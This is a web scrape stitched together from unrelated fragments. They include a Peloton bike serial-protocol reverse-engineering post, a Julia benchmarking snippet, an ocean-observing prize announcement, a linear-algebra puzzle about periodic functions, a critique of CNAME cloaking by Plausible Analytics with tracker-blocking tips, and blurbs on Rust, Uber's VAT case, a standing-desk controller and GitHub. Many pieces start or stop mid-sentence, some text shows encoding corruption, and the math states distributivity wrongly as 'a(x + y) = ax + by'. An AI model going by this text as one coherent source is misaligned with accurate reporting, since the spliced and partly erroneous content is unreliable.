The results are straightforward. It appears that all of these contractors, with the exception of the last one, used automated tools to carry out the testing. Hence, the majority of them failed to identify the critical vulnerabilities. Some of them thought they gained access to the host through SSH without realizing they actually gained access to the virtual environment of a honeypot. Finally, one of them ran a script found online without auditing it …</p></div></div></div>

        <p><strong><span>TL</span>;<span>DR</span></strong> - I’ve decoded (most of) the protocol that the Peloton bike uses to
communicate with its head unit tablet and built a device, the PeloMon, that takes that
data during a ride, without interfering with the Peloton software, to
broadcast it over Bluetooth <span>LE</span> to whatever devices you’d like — a watch, Zwift,
Wahoo, whatever. Stick around for logic analyzer traces, hardware diagrams,
cursing at Bluetooth, and some nice&nbsp;interfaces.</p>

<p>We have a Peloton at home. Originally, I was skeptical, but then I found
trainers I like and it’s fun to ride with friends. And really takes the edge
off all-day Zoom meetings to ride during a meeting with the camera turned&nbsp;off.</p>
<p>But, being the guy that I am, I’ve been curious about how the head unit —
which runs a lightly skinned Android — was collecting stats
from the actual bike. I was also a bit annoyed that though the Peloton software
will happily read data from an <span>HR</span> sensor, and will upload your ride data to
Strava, there was no way for it to <em>broadcast</em> data about a ride to a local
fitness appliance — which meant that although I could track the fact that I
was doing an “indoor bike” ride on my Garmin watch, the watch would see a 0
mile ride because it got no bike&nbsp;data.</p>
<p>Then a couple months ago, I came across
<a href="https://ptx2.net/posts/unbricking-a-bike-with-a-raspberry-pi/">this blog post</a>
in which someone on the Internet was able to hook up their (bricked) Flywheel
bike to Zwift using a Raspberry Pi to decode the bike sensor data and broadcast
it over Bluetooth — and I was inspired to finally give this project a shot.
What should we call a device broadcasting stats from the Peloton, monitoring it
if you will? How about&nbsp;“PeloMon”?</p>
<p>Let’s get down to&nbsp;it.</p>

<p>There are only two cables that plug into the tablet: a barrel jack carrying
<span>DC</span> power @ 12V (coming from the power brick), and a <span>TRRS</span> connector —
think “stereo aux cable”. So the data is clearly coming in on the latter.
Since I only wanted to observe the traffic between the <span>HU</span> and the bike,
not interrupt it, I used a headphone splitter cable to split the cable from the bike with an extra jack, and connected an aux cable from that extra jack
to the breakout. Such a connection might disrupt some high-speed communications
protocols, but my guess was that a) there wasn’t going to be that much traffic
to require anything fancy, b) nothing fast would be running over 3.5mm <span>TRRS</span>, and
c) this interface would be engineered with pretty wide tolerances for stability 
in a home environment. (Spoiler alert: all of these were&nbsp;true.)</p>
<p>The first step was to identify the pinout from the jack as best
as possible. Probing the leads with a <span>DMM</span> with the bike active showed that
Ring2 was at ground (0V with respect to the power supply’s ground)
with -5.5-6V between tip or ring1 and ground. Sleeve also appears to be
at ground, but it and Ring2 may not quite be the same (more on this later).
The negative voltages with respect
to ground are a pretty strong sign that we’re going to see <span>RS</span>-232&nbsp;signaling.</p>
<h2 id="decoding-the-wire-protocol-with-a-logic-analyzer"><a href="#decoding-the-wire-protocol-with-a-logic-analyzer">Decoding the wire protocol with a logic&nbsp;analyzer</a></h2>
<p>(If you’d like to load a PulseView trace to see the data for yourself, one session
file from a test ride is located in <code>peloton_decoding/resistance-stepped-10s.sr</code>
in <a href="https://github.com/ihaque/pelomon">the PeloMon GitHub repository</a>.)</p>
<p>Normally I’d wire up the breakout and hack something together on the Arduino
I have sitting around, but it turns out that logic analyzers have gotten
<em>really really cheap</em> so I splurged on a $12.50 one and thought I’d give it
a whirl — turned out to be a great idea that made it <span>WAY</span> easier to decode
the signals. With complete abandon regarding ground isolation and the voltage
tolerances of the <span>LA</span> (is it supposed to be able to handle negative voltage?),
I hooked it up to see what I’d get. These cheapo LAs emulate a Saleae Logic
analyzer and work fine in the open-source <a href="https://sigrok.org/wiki/PulseView">PulseView</a>&nbsp;software.</p>
<p><img alt="Hooking up the LA with D0 on tip, D4 on ring1, D5 on sleeve, and GND on ring2" src="https://ihaque.org/static/img/2020/10/20201015-pinout-0tip-4ring1-5sleeve-gndring2.png">
</p><center><strong>Hooking up the <span>LA</span> with D0 on tip, D4 on ring1, D5 on sleeve, and <span>GND</span> on ring2</strong></center>
<p><img alt="D0 on tip, D2 on ring1, D4 on ring2, and GND on sleeve" src="https://ihaque.org/static/img/2020/10/20201015-pinout-0tip-2ring1-4ring2-gndsleeve.png">
</p><center><strong>D0 on tip, D2 on ring1, D4 on ring2, and <span>GND</span> on sleeve</strong></center>
<p>There’s pretty clearly serial signaling going on over these wires! One
party seems to be sending requests on Tip every 100ms, and the other
party responds about a millisecond later on Ring1. While it wasn’t obvious
from the <span>DMM</span> whether signaling <span>GND</span> should be on Ring2 or Sleeve, from the <span>LA</span>
traces, it looks like there is less glitching on the response line if Ring2 is
used as <span>GND</span> - so we’ll do that. The narrow pulses are probably single bits,
so sampling at a high rate (a few hundred kHz) lets us measure the bit
rate as&nbsp;19200bps:</p>
<p><img alt="Counting samples in the LA shows a 19.2kHz signal" src="https://ihaque.org/static/img/2020/10/20201015-pinout-19200bps.png">
</p><center><strong>Counting samples in the <span>LA</span> shows a 19.2kHz signal</strong></center>
<p>PulseView also lets you add protocol decoders to particular wires. I put a <span>UART</span>
decoder on with D0 as “<span>RX</span>” and D4 as “<span>TX</span>”, and saw data, but with a ton of
low-level serial protocol errors. UARTs invert the signal going out on the wire
with the expectation that there will be another <span>UART</span> at the other end to
re-invert. Since we don’t have that second <span>UART</span>, we have to turn the “Invert <span>RX</span>”
and “Invert <span>TX</span>” options on in PulseView, and then we see clean data! I also
experimented with other serial options (data, parity, and stop bits), but the
first guess of 8N1 turned out&nbsp;correct.</p>
<p><img alt="Without inversion enabled, we see framing errors and break conditions" src="https://ihaque.org/static/img/2020/10/20201015-missing-inversion.png">
</p><center><strong>Without inversion enabled, we see framing errors and break conditions</strong></center>
<p><img alt="Turning on the inversion in software, we see data with no serial errors!" src="https://ihaque.org/static/img/2020/10/20201015-fixed-inversion.png">
</p><center><strong>Turning on the inversion in software, we see data with no serial errors!</strong></center>
<p>Following the data streams, we see that the data stream on the
Tip wire during a ride always consists of one of three different four-byte
packets, repeated round-robin every 100ms, with the responses on Ring1 to these
requests being longer, different in length depending on the request type, and
variable in content.
It seems likely then that the Tip shows us signaling from the head unit to the
bike, and Ring1 is the bike responding to the head unit with information
about variables like current speed, resistance, or power&nbsp;output.</p>
<p><strong>Thus, we’ve worked out the physical layer protocol for the Peloton
communications: <span>RS</span>-232 at 5.5V and 19200bps 8N1 encoding, with <span>HU</span>-to-bike
communications on Tip, bike-to-<span>HU</span> on Ring1, <span>GND</span> on Ring2, and something
ground-like on&nbsp;Sleeve.</strong></p>

<p>To investigate the encoding between the head unit and the bike, I used the
logic analyzer to capture a trace of the communications during a ride. (Shoutout
to Ben Alldis and his Ministry of Sound ride series!)
The data dump and scripts are available in the GitHub repository for this project
at https://github.com/ihaque/pelomon/, in the <code>peloton_decoding</code> subdirectory.)</p>
<h2 id="basic-packet-structure"><a href="#basic-packet-structure">Basic packet&nbsp;structure</a></h2>
<p>(To follow along, run <code>peloton_decoding/decoder_plots.py</code> from the
<a href="https://github.com/ihaque/pelomon">PeloMon Github repository</a>.)</p>
<p>During a ride, about every 100ms (100.66-100.8ms) the <span>HU</span> sends a request
to the bike, and the bike responds about 300us (i.e., 0.3ms) from the end
of the <span>HU</span>’s request. The <span>HU</span> sends three different request packets round robin.
Each request type has a different response length from the&nbsp;bike:</p>
<table> 
<tbody><tr><th><span>HU</span> Request</th><th>Bike Response Length</th><th>Example Bike Response</th></tr>
<tr><td><tt>F5 41 36 F6</tt></td><td>8 bytes</td><td><tt>F1 41 03 30 30 30 C5 F6</tt></td></tr>
<tr><td><tt>F5 44 39 F6</tt></td><td>10 bytes</td><td><tt>F1 44 05 30 30 30 30 30 2A F6</tt></td></tr>
<tr><td><tt>F5 4A 3F F6</tt></td><td>9 bytes</td><td><tt>F1 4A 04 38 36 36 30 13 F6</tt></td></tr>
</tbody></table>

<p>A few things are evident from simple inspection of the&nbsp;bytes:</p>
<ul>
<li>The first byte is a header - seems to be F5 from the <span>HU</span> and F1 from the&nbsp;bike.</li>
<li>All packets end in&nbsp;F6.</li>
<li>The second byte that the <span>HU</span> sends seems to be a request type, and is mirrored in the second byte in the bike’s&nbsp;response.</li>
<li>The third byte of the bike response is the length of the full packet minus 5 — probably indicates the length of the data payload following&nbsp;it.</li>
<li>Serial packets often carry a checksum, and here the second-to-last byte from either the <span>HU</span> or the bike seems to be that: it’s the sum (modulo 256) of all the bytes preceding&nbsp;it.</li>
</ul>
<p>Thus, the packet format seems to&nbsp;be:</p>
<ul>
<li><span>HU</span>: <code>F5 [request type] [checksum] F6</code></li>
<li>Bike: <code>F1 [request type] [payload length] [response bytes 1-n] [checksum] F6</code></li>
</ul>
<p>We can now throw together a quick plot of each response byte to look for&nbsp;patterns.</p>
<p><img alt="Bytewise plot of Peloton response data for common request packets during part of a ride" src="https://ihaque.org/static/img/2020/10/20201015-peloton-bytewise.png">
</p><center><strong>Bytewise plot of Peloton response data for common request packets during part of a ride</strong></center>
<p>It appears that every byte ranges from 0x30 to 0x39 — which is exactly the
<span>ASCII</span> range for decimal digits 0 through 9. Furthermore, the earlier bytes in
each packet appear to vary more quickly than the later ones through a ride,
suggesting that the least-significant digit comes first. <strong>The Peloton bike
is encoding its responses as little-endian <span>ASCII</span> digits.</strong> It’s easy enough
to dump a plot of these values per response type now that we know the&nbsp;encoding:</p>
<p><img alt="Decoded values sent by bike to head unit during a ride" src="https://ihaque.org/static/img/2020/10/20201015-peloton-ascii.png">

<p>(To follow along, run <code>peloton_decoding/decode_resistance.py</code> from the
<a href="https://github.com/ihaque/pelomon">PeloMon Github repository</a>.)</p>
<p>Glancing at these graphs it’s pretty clear that we have ride data of the Peloton
trifecta — cadence, power, and resistance — with a couple weird things thrown in
for flavor. Comparing to the Peloton ride stats, <strong>request type 0x41 seems to directly
return cadence in rpm and request type 0x44 returns 10 times power in watts (i.e.,</strong></p></div></div>

In the dynamic version, which uses the <strong>same</strong> code for any (<code>Float64</code>) vector of any length, and any permutation, the code is a fair bit longer and more complicated. In fact, all of the code shown above is simply to deal with things like throwing out of bounds errors in case the vector <code>v</code> does not have entries at the indicies <code>p</code> asks for. Then at the end, we see a call to <code>Base._unsafe_getindex</code> which actually does the indexing once all the error-checking is done.</p><p>So could this huge performance advantage in the static case be partly to the fact that we don’t need to check that the indexing operation is valid, since we know the lengths of both <code>v</code> and <code>p</code> at compile time in that case? We can check by benchmarking:</p><pre><code>julia&gt; @btime Base._unsafe_getindex($(IndexLinear()), $v, $p)

                  The Powering the Blue Economy™: Ocean Observing Prize challenges innovators to integrate marine renewable energy with ocean observation platforms, ultimately revolutionizing our ability to collect the data needed to understand, map, and monitor the ocean.

                  This joint prize between the Water Power Technologies Office (WPTO) at the U.S. Department of Energy and the Integrated Ocean Observing System (IOOS®) Office at the National Oceanic and Atmospheric Administration (NOAA) seeks to develop new technologies that can help fill the data gaps making it difficult to realize the full potential of the Blue Economy. The Ocean Observing Prize includes a series of competitions with millions of dollars in awards to encourage rapid innovation in the fields of marine energy and ocean observations, that began with the DISCOVER Competition and is followed by the DEVELOP Competition. The Pacific Northwest National Laboratory and the National Renewable Energy Laboratory are supporting DOE and NOAA on the development and administration of the prize.

                The Ocean Observing Prize is a series of competitions with cash awards to incentivize accelerated advancement of ideas from concept to demonstration. The first competition, the DISCOVER Competition, closed on February 12, 2020. Competitors submitted novel concepts that integrate ocean observing technologies with marine energy systems to address end-user needs across five broad themes: (1) Unmanned Vehicles; (2) Communications and Underwater Navigation; (3) Extreme Environments; (4) Buoys, Floats, and Tags; and (5) Blue Sea Ideas (i.e. other). Following the DISCOVER Competition, the DEVELOP Competition focuses on a single theme, <a href="https://americanmadechallenges.org/oceanobserving/develop.html">hurricane monitoring</a>, and challenges contestants to develop their ideas into a functioning prototype through three contests: DESIGN, BUILD, and SPLASH. Together, the DISCOVER and DEVELOP Competitions will award up to $3 million in cash prizes as well as other in-kind awards.
              </p>
              <p>
                The Ocean Observing Prize is repeatable, and it is expected that future iterations may focus on other themes. Through this competition, innovators will be able to tap into DOE and NOAA’s network of National Laboratories, energy incubators and accelerators, subject matter experts, and other resources across the nation to build novel technologies that collect critical ocean data.

<h2 id="vector-spaces"><a href="#vector-spaces">Vector Spaces</a></h2>
<p>
A fascinating result that appears in linear algebra is the fact that the
set of real numbers \( \mathbb{R} \) is a vector space over the set of
rational numbers \( \mathbb{Q}. \) This may appear surprising at first
but it is easy to show that it is indeed so by checking that all eight
axioms of vector spaces hold good:
</p>

<ol>
  <li>
    <p>
      Commutativity of vector addition:<br>
      \( x + y = y + x \) for all \( x, y \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Associativity of vector addition:<br>
      \( x + (y + z) = (x + y) + z \) for all \( x, y, z \in \mathbb{R}.
      \)
    </p>
  </li>
  <li>
    <p>
      Existence of additive identity vector:<br>
      We have \( 0 \in \mathbb{R} \) such that \( x + 0 = x \) for all
      \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Existence of additive inverse vectors:<br>
      There exists \( -x \in \mathbb{R} \) for all \( x \in \mathbb{R}.
      \)
    </p>
  </li>
  <li>
    <p>
      Associativity of scalar multiplication:<br>
      \( a(bx) = (ab)x \) for all \( a, b \in \mathbb{Q} \) and all \( x
      \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Distributivity of scalar multiplication over vector addition:<br>
      \( a(x + y) = ax + by \) for all \( a \in \mathbb{Q} \) and all \(
      x, y \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Distributivity of scalar multiplication over scalar addition:<br>
      \( (a + b)x = ax + bx \) for all \( a, b \in \mathbb{Q} \) and all
      \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Existence of scalar multiplicative identity:<br>
      We have \( 1 \in \mathbb{Q} \) such that \( 1 \cdot x = x \) for
      all \( x \in \mathbb{R}. \)
    </p>
  </li>
</ol>
<p>
  This shows that the set of real numbers \( \mathbb{R} \) forms a
  vector space over the field of rational numbers \( \mathbb{Q}. \)
  Another quick way to arrive at this fact is to observe that \(
  \mathbb{Q} \subseteq \mathbb{R}, \) that is, \( \mathbb{Q} \) is a
  subfield of \( \mathbb{R}. \) Any field is a vector space over any of
  its subfields, so \( \mathbb{R} \) must be a vector space over \(
  \mathbb{Q}. \)
</p>


<h2 id="problem"><a href="#problem">Problem</a></h2>

<p>
Here is an interesting problem related to vector spaces that I came
across recently:
</p>

<div>
<p>
Define two periodic functions \( f \) and \( g \) from \( \mathbb{R} \)
to \( \mathbb{R} \) such that their sum \( f + g \) is the identity
function. The axiom of choice is allowed.
</p>
<p>
A function \( f \) is periodic if there exists \( p \gt 0 \) such that
\( f(x + p) = f(x) \) for all \( x \) in the domain.
</p>
</div>

<p>
<em>
If you want to think about this problem, this is a good time to pause
and think about it. There are spoilers ahead.
</em>
</p>


<h2 id="solution"><a href="#solution">Solution</a></h2>

<p>
The axiom of choice is equivalent to the statement that every vector
space has a basis. Since the set of real numbers \( \mathbb{R} \) is a
vector space over the set of rational numbers \( \mathbb{Q}, \) there
must be a basis \( \mathcal{H} \subseteq \mathbb{R} \) such that every
real number \( x \) can be written uniquely as a finite linear
combination of elements of \( \mathcal{H} \) with rational coefficients,
that is,
\[
  x = \sum_{a \in \mathcal{H}} x_a a
\]
where each \( x_a \in \mathbb{Q} \) and \( \{ a \in \mathcal{H} \mid x_a
\ne 0 \} \) is finite. The set \( \mathcal{H} \) is also known as the
Hamel basis.
</p>

<p>
In the above expansion of \( x, \) we use the notation \( x_a \) to
denote the rational number that appears as the coefficient of the basis
vector \( a. \) Therefore \( (x + y)_{a} = x_a + y_a \) for all \( x, y
\in \mathbb{R} \) and all \( a \in \mathcal{H}. \)
</p>

<p>
We know that \( b_a = 0 \) for distinct \( a, b \in \mathcal{H} \)
because \( a \) and \( b \) are basis vectors. Thus \( (x + b)_{a} = x_a
+ b_a = x_a + 0 = x_a \) for all \( x \in \mathbb{R} \) and distinct \(
a, b \in \mathcal{H}. \) This shows that a function \( f(x) = x_a \) is
a periodic function with period \( b \) for any \( a \in \mathcal{H} \)
and any \( b \in \mathcal{H} \setminus \{ a \}. \)
</p>

<p>
Let us define two functions:
\begin{align*}
  g(x) &amp; = \sum_{a \in \mathcal{H} \setminus \{ b \}} x_a a,
  &amp;
  h(x) &amp; = x_b b.
\end{align*}
where \( b \in \mathcal{H} \) and \( x \in \mathbb{R}. \) Now \( g(x) \)
is a periodic function with period \( b \) for any \( b \in \mathcal{H}
\) and \( h(x) \) is a periodic function with period \( c \) for any \(
c \in \mathcal{H} \setminus \{ b \}. \) Further,
\[
  g(x) + h(x)
  = \left( \sum_{a \in \mathcal{H} \setminus \{ b \}} x_a a \right) + x_b b
  = \sum_{a \in \mathcal{H}} x_a a
  = x.
\]
Thus \( g(x) \) and \( h(x) \) are two periodic functions such that
their sum is the identity function.
</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>For the last few weeks, my feeds and federated timelines have been filled with absolutely brilliant marketing campaigns for Plausible Analytics, the new open-source privacy-focused website analytics tool. Plausible Analytics has enjoyed exponential growth and is frequently recommended by privacy-conscious voices in the FOSS community.</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/elementary-io.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/elementary-io-663x317.png" alt="Plausible Analytics - elementary OS"></a><figcaption><p>Plausible Analytics showing public visitor metrics for the elementary OS website.</p></figcaption></figure><p>So does Plausible Analytics deliver on its promise to provide an ethical privacy-friendly alternative to Google Analytics? Let’s have a closer look.</p><p>Plausible Analytics claims to be compliant with GDPR, CCPA, and PECR out of the box. Allegedly, it’s not necessary to ask for and obtain user consent as no personal data is ever being collected.</p><p>Plausible Analytics does however admit that it collects your user-agent and IP address to uniquely identify your visit. Additionally, it stores information about your browser, operating system, device type, and location (based on your IP address). Even if the stored personal data is being anonymized (and not pseudonymized which sounds more likely), the data is still being processed.</p><p>If you’re familiar with GDPR, then you’re likely aware that it certainly covers collecting of online identifiers, such as IP addresses, and browser characteristics used for fingerprinting.</p><p>Another issue I came across when signing up for their service was that Plausible Analytics doesn’t provide their customers with a GDPR data processing agreement (DPA). When you, the website owner, allows a third party to collect and process personal data, you’re required to sign a DPA to be GDPR compliant.</p><h2 id="privacy-friendly-website-analytics">Privacy-friendly website analytics</h2><p>In my opinion, privacy-friendly should be more than a buzzword used to throw shade at Google Analytics. Here are a few key points that I attribute to being privacy-friendly (none of which are adhered to by Plausible Analytics):</p><ul><li>Ask users for their consent before tracking.</li><li>Allow users who don’t want to be tracked to opt-out.</li><li>Respect users providing a Do Not Track (DNT) header.</li><li>Don’t disguise your tracker as a first-party resource to avoid ad-blockers.</li></ul><p>Being privacy-friendly is also about respecting one’s right to choose what data to share, and with whom. Plausible Analytics seems to think that it’s alright to make that choice on your behalf and I wholeheartedly disagree.</p><h2 id="cname-cloaking">CNAME cloaking</h2><p>This abysmal technique remains ever popular with <a href="https://github.com/uBlockOrigin/uBlock-issues/issues/780" target="_blank">unethical advertisers</a> as an effective countermeasure against ad-blockers. The technique effectively disguises the third-party tracker as a first-party resource by having the website owner pointing a subdomain to the third-party server using a CNAME record.</p><p>Plausible Analytics are at least upfront about why they deploy CNAME cloaking, as explained in their documentation:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/plausible-cname-cloaking.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/plausible-cname-cloaking-663x277.png" alt="Plausible Analytics - CNAME cloaking"></a><figcaption><p>Plausible Analytics documenting how to defeat ad-blockers.</p></figcaption></figure><p>What, some people are trying to block your privacy-friendly tracker? Now we can’t have that, tracking absolutely everyone gives Plausible Analytics a competitive edge against Google Analytics.</p><h3 id="how-does-cname-cloaking-work">How does CNAME cloaking work?</h3><p>An excellent question, but first we need to understand exactly what makes CNAMEs special by design and implementation as according to <a href="https://tools.ietf.org/html/rfc1034" target="_blank">rfc1034</a>.</p><blockquote><div><p>A CNAME RR identifies its name as an alias, and specifies the corresponding canonical name.</p><p>When a name server fails to find a desired RR in the resource set associated with the domain name, it checks to see if the resource set consists of a CNAME record with a matching class. If so, the name server includes the CNAME record in the response and restarts the query at the domain name specified in the data field of the CNAME record.</p></div></blockquote><p>Let’s see how it works by using the domain markosaric.com as an example. The domain is owned by Marko Saric, digital marketing guru of team Plausible Analytics. The subdomain he uses to disguise the tracker is ms.markosaric.com.
When performing a DNS query for ms.markosaric.com, we get the following response:</p><pre><code>$ dig ms.markosaric.com

;; ANSWER SECTION:
ms.markosaric.com.	14400	IN	CNAME	custom.plausible.io.
custom.plausible.io.	300	IN	A	46.101.161.209
</code></pre><p>As we can tell, the DNS resolver identifies ms.markosaric.com as an alias for custom.plausible.io. Additionally, because it’s a CNAME record, we also get the A record for custom.plausible.io which is pointing to 46.101.161.209.</p><p>When a browser requests the first-party resource for ms.markosaric.com, the same “DNS based redirect” takes place, and the tracker gets inserted from custom.plausible.io. However, because this happens at the DNS level, ad-blockers are unable to identify the tracker.</p><p>Let’s see how this dark magic repels uBlock Origin on Chromium after adding a custom filter to block the plausible.io domain.</p><pre><code>! Custom uBlock Origin filter for plausible.io
||plausible.io^
</code></pre><p>The image below consists of two merged screenshots. The left side of the image shows how the custom filter fails to stop the tracker when CNAME cloaking is in effect. The right side of the image shows the same filter successfully blocking the tracking domain when accessed directly:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-cloak.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-cloak-663x232.png" alt="CNAME cloaking"></a><figcaption><p>CNAME cloaking used to escape filtering from uBlock Origin on Chromium.</p></figcaption></figure><p>As shown above, the tracker (index.js) is being loaded from the remote IP address of 46.101.161.209, which resolves to custom.plausible.io. However, the script is not blocked and the harvesting of personal data is in full effect.</p><p>This technique is effective because uBlock Origin doesn’t have access to DNS queries and is entirely oblivious to the trick being pulled behind its back. I wouldn’t describe this approach as being either privacy-friendly or ethical.</p><h2 id="how-to-block-plausible-analytics">How to block Plausible Analytics</h2><p>Though intrusive, unethical, and annoying, CNAME cloaking can be defeated. I’ll scratch the surface with a few options that will help you to protect your privacy.</p><h3 id="ublock-origin-on-firefox">uBlock Origin on Firefox</h3><p>You can easily block Plausible Analytics with uBlock Origin on Firefox by adding the filter I referenced earlier in this article. Firefox allows extensions (if given permission) to resolve domain names by exposing a <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/dns" target="_blank">DNS API</a>. This allows uBlock Origin to identify and block disguised trackers:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-exposed-ublock-origin.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-exposed-ublock-origin.png" alt="uBlock Origin on Firefox"></a><figcaption><p>uBlock Origin using Firefox’s DNS API to expose and block CNAME cloaking.</p></figcaption></figure><h3 id="dnscrypt-proxy">dnscrypt-proxy</h3><p>If you don’t want to use Firefox, or prefer to block Plausible Analytics on the DNS level, then you’ll need a tool that can scrub CNAME responses. The right tool for the job in my opinion is <a href="https://github.com/DNSCrypt/dnscrypt-proxy" target="_blank">dnscrypt-proxy</a>. The dnscrypt-proxy client’s domain blacklist provides support for CNAME blocking.</p><p>The following animated gif shows how dnscrypt-proxy can block the CNAME record containing the unwanted tracker.</p><p><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/dnscrypt-proxy-cname-blacklist.gif" alt="dnscrypt-prox blocking a cloaked CNAME record" title="Blocking Plausible Analytics with dnscrypt-proxy"></p><p>Pretty neat huh.</p><h3 id="other-options">Other options</h3><p>Well there are a few, you could always:</p><ul><li>Block any IP address in use by custom.plausible.io with your firewall.</li><li>Disable JavaScript in your browser (it will block the tracking, not the connection).</li><li>Block the <a href="https://github.com/rogercomply/plausible-analytics-blocklist/blob/master/subdomains" target="_blank" rel="noopener noreferrer nofollow" title="A list of subdomains used for CNAME cloaking with Plausible Analytics">subdomains</a> used for CNAME cloaking.</li><li>Use a DNS service provider already blocking unwanted trackers.</li><li>Ask Plausible Analytics to respect your right to privacy.</li></ul><h2 id="what-does-the-foss-say">What does the FOSS say?</h2><p>I’ll admit to being mildly amused and surprised that privacy-conscious people in the FOSS community are promoting this service. Even more surprising is the fact that they’re configuring CNAME cloaking for their websites. I mean, seriously, you can’t exactly argue ignorance in this matter.</p><p>Plausible Analytics is good at targeted marketing to the right people. However, I don’t personally believe that the product delivers on its promise. Open-source or not, the business model here is still to monetize personal data for profit however you may wish to dress it up.</p></div></div>]]>

<p>In this podcast episode of Security Headlines: Carl Lerche, Rust developer and<br>
maintainer of the popular Rust programming library Tokio joins us.<br>
He walks us through what Rust and Tokio is, how companies are building their stacks with Rust.<br>
This and a lot more on this episode of Security Headlines!</p>

<p>Carl heard about this new programming language called Rust and wanted to check it out.
What started as a hobby project led Carl down the rust path and he now works for Amazon as a<br>
Rust developer! Helping Amazon build stable infrastructure.</p>

<p>We get to hear the story of how Tokio got started and how the Rust programming language has changed<br>
over the years.<br>
Since a large chunk of Tokio code is focusing on making it easy for developers to write asynchronous functions.<br>
And be able to write fast code that does not get stuck and lets the data flow.<br>
But how does non-blocking code really work? What differs Rust from the programming language Golang is<br>
Golangs, adoption of green threads instead of using regular threads.<br>
Carl walks us through how this works and how Rust tackles this problem “the Rust way”.</p>

            <div id="page">
                <p><span>Way back in April 2017, we announced we were going to take on HMRC’s</span> <a href="https://rebrand.ly/data-parliament-2017">failure to assess</a> <span>Uber to VAT which corroded public trust, not only in HMRC, but in politics more generally.Â&nbsp;</span></p>
<p><span>And itâ€™s been quite the scrap…Â&nbsp;</span></p>
<p><span>There have been lows – like us spending the money we raised in the crowdfunder trying to get a protective costs order and failing.Â&nbsp;</span></p>
<p><span>And there have been highs – like us persuading the High Court </span><a href="https://rebrand.ly/ewhc-2019"><span>late last year</span></a><span> that a fairly spineless HMRC was allowed to do what the legislation plainly allowed it to do and tell us it had (at last) assessed Uber.</span></p>
<p><span>There have been further lows – as last week when the Court of Appeal refused us permission to bring our judicial review against HMRC.</span></p>
<p><span><span>But ultimately </span><span>we triumphed</span><span>. </span></span><a href="https://rebrand.ly/ussec-10q"><span>Uber’s US accounts</span></a><span> now confirm that HMRC has assessed Uber to VAT on fares – both prospectively and retrospectively.</span></p>
<p><span>And thatâ€™s all we ever wanted.Â&nbsp;</span></p>
<p><span><span>It’s been a long, bumpy (and expensive) ride – if you’ll allow me the metaphor – but we have reached our destination. I am so proud that together we have forced HMRC, belatedly, to act – </span><span>Uber has now been asked to pay the Â£1.5bn of tax they owe the public purse.</span></span></p>
<p><span>We couldnâ€™t have done it without your support. So thank you.</span></p>
<p><span>Iâ€™d also like to thank the lawyers – George Peretz QC, Jack Anderson, Hui Ling McCarthy QC, Christopher Knight, David Greene, Vikram Sachdeva QC, and Alex Rook – who helped out, most for even less than the smell of an oily rag, along the way.</span></p>

		With everything wired up correctly I could now control both an "up" relay and "down" relay via code.
	</p></section><section><div><h2>Height Sensors</h2><p>With the ability to raise and lower the desk via the relays (and code), I needed to think about how to actually control the desk and get it into a comfortable standing or sitting position automatically.</p><p>One easy approach is to simply raise or lower the desk for a certain amount of time. In other words, to get into the "standing" position just enable the "up" relay for 5 seconds. To go back to "sitting" enable the "down" relay for 5 seconds.</p><p>This doesn't really work though. The desk lowers much more quickly than it raises (due to gravity) so it's very hard to get the correct timings. Furthermore you can easily get out-of-sync, meaning you have to manually adjust the height again, making the whole endeavour pointless (of course I only realised this once I had assembled everything).</p><p>A better approach is to use a height sensor. These are small little devices that send out a sound wave and measure how long it takes to return. With some simple maths you have the height of the ground.<br></p></div></section><section><div><figure><img data-src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4499.f1602438374.jpg?mtime=20201011184543&amp;focal=none" alt="IMG 4499" title="IMG 4499" src="https://cdn.timmyomahony.com/assets/posts/sit-stand-controller/IMG_4499.f1602438374.jpg?mtime=20201011184543&amp;focal=none"><figcaption>

<p>There’s a story about an art teacher that split their class in half. They told one half of the students that they’d be graded based on a single piece of work, and the other half that they would be graded on the quantity of work produced.</p>

<p>The half that was being graded on quantity ended up producing higher quality pieces.</p>

<p>By iterating and learning from their mistakes they actually ended up producing better work than the students that only had to produce one piece.</p>

<p>Quantity leads to quality.</p>



<p>Sharing work helps you to think and develop. The feedback you get feeds into the next iteration.</p>

<p>If you’ve enjoyed creating something then there’s a good chance that at least a handful of people in the world will enjoy seeing it or hearing about it.</p>

<p>Promoting yourself and your work can be a good way to clarify your thinking and future direction.</p>

<h2 id="get-better-by-creating-more">Get better by creating more</h2>

<p>Produce lots of stuff and share it.</p>

<p>Being prolific doesn’t mean that everything you produce has to be absolute gold. But the process of producing large quantities of work ultimately leads to a higher quality of work.</p>

<p>Published on <span id="published">2020-10-23</span>. Modified on <span id="modified">2020-10-25</span>.</p>
<p>Thousands of the worlds best Open Source projects are still hosting their code repositories on GitHub. Since Microsoft has purchased GitHub this has become a serious problem.</p>

<p><strong>Update 2020-10-25:</strong> This is not directly related as it could happen on other hosting platforms as well, but just a few hours after I wrote this the youtube-dl repository was taken down from GitHub by RIAA due to a <a href="https://github.com/ytdl-org/youtube-dl/">DMCA request</a>.</p>

<p>It is no news that <a href="https://en.wikipedia.org/wiki/GitHub#Acquisition_by_Microsoft">Microsoft purchased GitHub in 2018</a>, everyone knows that. Yet despite that fact thousands of the worlds most important Open Source projects continue to host their code on GitHub. People seem to have forgotten just how rotten Microsoft really is and how dangerous that situation is.</p>
<p>It is not so much the fact that many projects host their projects on GitHub, it is the fact that many projects haven't secured the code outside of GitHub! They rely fully on GitHub to maintain and protect the code.</p>
